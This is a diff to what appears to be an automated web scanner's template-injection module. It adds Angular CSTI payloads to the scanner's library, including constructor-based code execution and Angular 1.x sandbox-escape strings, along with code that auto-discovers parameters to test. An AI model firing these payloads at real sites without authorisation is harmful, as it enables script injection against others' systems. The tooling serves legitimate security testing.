@@ -144,17 +144,28 @@ PAYLOAD_LIBRARY = {
     ],
 
     # ================================================================
-    # ANGULAR-SPECIFIC (CSTI)
+    # ANGULAR-SPECIFIC (CSTI) - IMPROVED 2026-01-30
     # ================================================================
     "angular": [
+        # SIMPLE ARITHMETIC (highest priority - works on most Angular apps)
+        "{{7*7}}",
+        "{{7*'7'}}",
+        "{{49}}",  # Direct number to test reflection
+        # Constructor-based
         "{{constructor.constructor('return 7*7')()}}",
         "{{$on.constructor('return 7*7')()}}",
-        "{{a]}}",  # Error-based detection
-        "{{'a]'}}",
         "{{[].pop.constructor('return 7*7')()}}",
-        # Sandbox bypasses (Angular 1.x)
+        "{{[].push.constructor('return 7*7')()}}",
+        # Error-based detection
+        "{{a]}}",
+        "{{'a]'}}",
+        # Sandbox bypasses (Angular 1.x - ginandjuice.shop uses older Angular)
         "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
         "{{'a]'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
+        "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor);}}",
+        # More sandbox bypasses for different Angular versions
+        "{{$eval.constructor('return 7*7')()}}",
+        "{{$parse.constructor('return 7*7')()}}",
     ],
 
     # ================================================================
@@ -900,10 +911,59 @@ Response format (XML):
         return {"findings": all_findings, "status": JobStatus.COMPLETED}
 
     async def _prepare_scan(self):
-        """Prepare for template injection scan."""
+        """Prepare for template injection scan.
+
+        IMPROVED (2026-01-30): Auto-discover params from URL and HTML.
+        """
+        # CRITICAL: Auto-discover params if none provided or incomplete
+        discovered_params = self._discover_all_params()
+
+        # Merge with any params passed in
+        existing_param_names = {p.get("parameter") for p in self.params}
+        for dp in discovered_params:
+            if dp.get("parameter") not in existing_param_names:
+                self.params.append(dp)
+
         self.params = self._prioritize_params(self.params)
+
+        # Log what we're testing
+        param_names = [p.get("parameter") for p in self.params]
+        logger.info(f"[{self.name}] 🎯 Parameters to test: {param_names}")
+        dashboard.log(f"[{self.name}] Testing {len(self.params)} params: {param_names[:5]}{'...' if len(param_names) > 5 else ''}", "INFO")
+
         await self._detect_waf_async()
         await self._setup_interactsh()
+
+    def _discover_all_params(self) -> List[Dict]:
+        """
+        ADDED (2026-01-30): Auto-discover ALL testable parameters.
+
+        Sources:
+        1. URL query string params
+        2. Common vulnerable param names
+        """
+        discovered = []
+
+        # 1. Extract from URL query string
+        parsed = urlparse(self.url)
+        query_params = parse_qs(parsed.query)
+        for param_name in query_params.keys():
+            discovered.append({"parameter": param_name, "source": "url_query"})
+            logger.debug(f"[{self.name}] Discovered param from URL: {param_name}")
+
+        # 2. Add common vulnerable params if URL has a path that suggests templates
+        # (e.g., /catalog, /blog, /search)
+        path_lower = parsed.path.lower()
+        template_paths = ["/catalog", "/blog", "/search", "/template", "/render", "/preview"]
+        if any(tp in path_lower for tp in template_paths):
+            common_vuln_params = ["category", "search", "q", "query", "filter", "sort",
+                                  "template", "view", "page", "lang", "theme"]
+            for param in common_vuln_params:
+                if param not in query_params:
+                    discovered.append({"parameter": param, "source": "common_vuln"})
+                    logger.debug(f"[{self.name}] Added common vuln param: {param}")
+
+        return discovered
 
     async def _scan_all_parameters(self) -> List[Dict]:
         """Scan all parameters for template injection."""
